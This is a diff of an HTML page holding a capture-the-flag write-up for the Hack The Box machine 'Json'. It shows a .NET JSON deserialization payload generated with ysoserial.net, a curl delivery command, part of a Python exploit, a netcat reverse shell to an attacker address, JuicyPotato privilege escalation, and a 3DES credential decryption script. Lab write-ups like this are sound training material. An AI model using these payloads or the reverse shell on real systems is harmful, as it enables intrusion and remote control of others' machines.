@@ -1,36 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-      
-    <meta name="twitter:title" content="Json">
-    <meta name="twitter:description" content="10.10.10.158 - [MEDIUM] Json by Altelus">
-    <meta name="twitter:card" content="summary">
-
-    <meta property="og:image" content="/writeups/htb/boxes/images/json_1.png">
-    <meta property="og:description" content="10.10.10.158 - [MEDIUM] Json by Altelus">
-    <title>Json</title><!-- Begin Jekyll SEO tag v2.6.1 -->
-<meta name="generator" content="Jekyll v4.0.0" />
-<meta property="og:title" content="Json" />
-<meta property="og:locale" content="en_US" />
-<link rel="canonical" href="http://localhost:4000/writeups/htb/boxes/Json.html" />
-<meta property="og:url" content="http://localhost:4000/writeups/htb/boxes/Json.html" />
-<script type="application/ld+json">
-{"@type":"WebPage","headline":"Json","url":"http://localhost:4000/writeups/htb/boxes/Json.html","@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
-
-
-<body>
-    <div class="container"><header>
-  <div class="menu">
-    <ul><li><a href="/">Home</a></li><li><a href="/about.html">About</a></li><li><a href="/writeups/">Writeups</a></li></ul>
-  </div>
-</header>
-<main>
-      <h1 id="medium-json-">[MEDIUM] Json <br /></h1>
+I"X<h1 id="medium-json-">[MEDIUM] Json <br /></h1>
 
 <p><img src="/writeups/htb/boxes/images/json_1.png# icon" alt="Json icon" /></p>
 
@@ -321,19 +289,20 @@ There is nothing really new in there. Even the password hash is also just “adm
 </code></pre></div></div>
 
 <p><br />
-However, the result is also the JSON received earlier but only in decoded base64 form.</p>
+However, the result is also the JSON received earlier but only in decoded base64 form.
+<img src="/writeups/htb/boxes/images/json_14.png#" alt="14" /></p>
 
-<h2 id="web-service-exploitation-deserialization-exploit">Web Service Exploitation. (Deserialization Exploit)</h2>
+<h1 id="web-service-exploitation-deserialization-exploit">Web Service Exploitation. (Deserialization Exploit)</h1>
 <p>However, a malformed json being sent to the server either via two of those links will return an error. 
 <img src="/writeups/htb/boxes/images/json_15.png" alt="15" />
 It means that the deserialization of the data is mishandled and can be a vulnerability. We can check this with a tool called <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>.
 <br /></p>
 
-<p>Going to a windows machine. After copying and running the ysoserial.exe file in a windows machine using the command:</p>
+<p>Running the .exe file in a windows machine:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\y</span>soserial.net <span class="nt">-f</span> Json.Net <span class="nt">-g</span> ObjectDataProvider <span class="nt">-c</span> <span class="s2">"cmd /c ping 10.10.14.87"</span>
 
 </code></pre></div></div>
-<p>It will give us this payload:</p>
+<p>It will give this payload:</p>
 
 <pre><code class="language-JSON">{
     '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
@@ -345,10 +314,8 @@ It means that the deserialization of the data is mishandled and can be a vulnera
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }
 </code></pre>
-<p>Copying the payload and save it to our Kali Linux box as payload.txt</p>
-
 <p><br /></p>
-<h3 id="targeting--apitoken">Targeting : /api/token</h3>
+<h2 id="targeting--apitoken">Targeting : /api/token</h2>
 
 <p>We setup an icmp sniffer:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -i tun0 icmp
@@ -359,7 +326,7 @@ It means that the deserialization of the data is mishandled and can be a vulnera
 </code></pre></div></div>
 <p>However, this attack only made the server return an error and the server did not execute the ping command.
 <br /></p>
-<h3 id="targeting--apiaccount">Targeting : /api/Account</h3>
+<h2 id="targeting--apiaccount">Targeting : /api/Account</h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.158/api/Account <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s2">"Bearer: </span><span class="si">$(</span><span class="nb">cat </span>payload.txt | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="si">)</span><span class="s2">"</span>
 </code></pre></div></div>
 <p>This attack made our ping command executed!</p>
@@ -367,20 +334,6 @@ It means that the deserialization of the data is mishandled and can be a vulnera
 <p><img src="/writeups/htb/boxes/images/json_16.png" alt="16" /></p>
 
 <p>With this, I created a python script that inputs our command so our payload will be flexible.</p>
-
-<p>New payload - payload_flex.txt:</p>
-<pre><code class="language-JSON">{
-    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
-    'MethodName':'Start',
-    'MethodParameters':{
-        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-        '$values':['%s', '%s']
-    },
-    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
-}
-</code></pre>
-<p><br />
-And our python exploit - json_exploit.py</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">base64</span>
@@ -417,7 +370,7 @@ And our python exploit - json_exploit.py</p>
 
 </code></pre></div></div>
 
-<h3 id="spawning-a-shell">Spawning a Shell</h3>
+<h1 id="spawning-a-shell">Spawning a Shell</h1>
 
 <p>To spawn a shell wth this, we can upload netcat executable for windows then execute it also via the script with powershell or cmd execution.
 <br />
@@ -427,8 +380,8 @@ Let’s first setup http server that contains the netcat executable. I used pyth
 After the netcat is uploaded, execute the following:</p>
 <pre><code class="language-Bash">Command: powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
 </code></pre>
-<p>NOTE:
-If “powershell.exe” is used immediately, the server doesn’t spawn a shell.</p>
+<h1 id="note">NOTE:</h1>
+<p>If “powershell.exe” is used immediately, the server doesn’t spawn a shell.</p>
 
 <p><br />
 We successfuly spawned a shell with “userpool” as our user!</p>
@@ -436,19 +389,19 @@ We successfuly spawned a shell with “userpool” as our user!</p>
 <p><img src="/writeups/htb/boxes/images/json_18.png# big" alt="18" />
 <br /></p>
 
-<h2 id="user-flag">User Flag</h2>
+<h1 id="user-flag">User Flag</h1>
 <p>We can just go to <code class="highlighter-rouge">C:\Users\userpool\Desktop\</code> to get our user flag.</p>
 
 <p><img src="/writeups/htb/boxes/images/json_19.png# big" alt="19" /></p>
 
-<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h2 style="font-size: 1.4em">Privilege Escalation</h2>
 <p><br /></p>
 
 <p>There are two ways of getting root:</p>
 
-<h2 id="method-1">Method 1</h2>
+<h2 style="font-size: 1.3em">Method 1</h2>
 
-<h3 id="enumeration-1">Enumeration</h3>
+<h2 style="font-size: 1.2em">Enumeration</h2>
 
 <p>We can check the privileges of our user. It’s stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM</p>
 
@@ -458,7 +411,7 @@ We successfuly spawned a shell with “userpool” as our user!</p>
 
 <p><img src="/writeups/htb/boxes/images/json_21.png# big" alt="21" /></p>
 
-<h3 id="juicypotato-exploitation">JuicyPotato Exploitation</h3>
+<h2 style="font-size: 1.2em">JuicyPotato Exploitation</h2>
 <p>We can use the <a href="https://github.com/ohpe/juicy-potato/">JuicyPotato exploit</a> to exploit this setting.<br /></p>
 
 <p>It’s also needed that a correct CLSID is selected in order for this to work. The list of CLSID I used for this version of windows is <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter">here</a>
@@ -482,9 +435,9 @@ After the netcat receives the connection, we are connected as <code class="highl
 
 <p><br /></p>
 
-<h2 id="method-2">Method 2</h2>
+<h2 style="font-size: 1.3em">Method 2</h2>
 
-<h3 id="enumeration-2">Enumeration</h3>
+<h2 style="font-size: 1.2em">Enumeration</h2>
 <p>If we go to C:\Program Files, there is a folder called “Sync2Ftp” and here is its contents:</p>
 
 <p><img src="/writeups/htb/boxes/images/json_24.png# big" alt="24" />
@@ -513,13 +466,13 @@ After retrieving the two files, it can now be checked that the executable is .NE
 </code></pre></div></div>
 <p><br /></p>
 
-<h3 id="reversing-the-net-executable">Reversing the .NET executable</h3>
+<h2 style="font-size: 1.2em">Reversing the .NET executable</h2>
 <p>To reverse or decompile the .NET executable, dotPeek is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.</p>
 
 <p><img src="/writeups/htb/boxes/images/json_26.png" alt="26" />
 Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has <code class="highlighter-rouge">hashing</code> variable that decides whether or not to hash the key.</p>
 
-<h3 id="decrypting-username-and-password">Decrypting username and password</h3>
+<h2 style="font-size: 1.2em">Decrypting username and password</h2>
 <p>Here’s the written python script to decrypt the username and password.</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">DES3</span>
 <span class="kn">import</span> <span class="nn">base64</span>
@@ -556,7 +509,7 @@ USER: superadmin
 PASS: funnyhtb
 </code></pre></div></div>
 <p><br /></p>
-<h3 id="ftp-login">FTP Login</h3>
+<h2 style="font-size: 1.2em">FTP Login</h2>
 <p>Since it is said to “Sync” with FTP, use the credentials first to FTP.
 <img src="/writeups/htb/boxes/images/json_27.png# big" alt="27" />
 <br /></p>
@@ -568,11 +521,4 @@ PASS: funnyhtb
 <br />
 Thank you for reading.</p>
 
-
-
-    </main><footer>
-  
-</footer>
-</div>
-  </body>
-</html>
+:ET
